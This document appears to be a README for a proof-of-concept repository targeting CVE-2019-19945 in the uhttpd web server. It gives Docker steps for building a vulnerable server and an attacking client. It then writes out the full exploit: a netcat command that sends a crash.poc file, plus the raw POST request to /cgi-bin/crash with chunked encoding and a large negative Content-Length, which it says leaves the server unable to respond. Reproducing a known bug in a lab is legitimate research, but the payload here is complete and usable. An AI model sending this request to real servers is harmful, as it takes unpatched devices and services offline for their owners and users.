# CVE-2019-19945_Test


This is the code for the first Proposed CVE

1. Install Docker 

2. Build & RUN Server
cd Server 
docker build  -t server/cve  .
docker run -d --name server -p 80:80 server/cve
4. Get Server Container IP
Linux
sudo docker container inspect server | grep -i IPAddress
Windows Powershell
docker container inspect server | Select-String "IPAddress"
Extract IP and add it to Command for building the Client
You can check the server by going to localhost:80 in your browser
5. Build & Run Client
by uncommenting the CMD in the Client/Dockerfile the attack will automatically start with the start of the container
cd ../Client/
docker build  --build-arg server_ip=<SERVER_IP> -t client/cve  .
docker run -d -p 8080:8080 client/cve
6. Attach to CLient Docker 
docker container ls
find client/cve container && attach
docker exec -it <ContainerID> /bin/sh
7. When Ready Launch Attack 
./crash.sh 
8. Server will be unable to respond




### Commented Source Code
There really is no use in providing commented Sourcecode as the Exploit is very short


The Exploit then consits of using Netcat  and sending a Post request with a negative large Content-Length to the Server Concering the handling of files in the cgi-bin/ directory

The Execution is conducted using a simple netcat script. Here Referencing a file in the CGI-bin Folder of the Server called Crash
nc <SERVER_IP>  < crash.poc 

##### crash.poc
POST /cgi-bin/crash HTTP/1.0
Transfer-Encoding: chunked
Content-Length: -100000  



The largest issue was trying to get the old versions of uhttpd to run in a up to date docker environment.





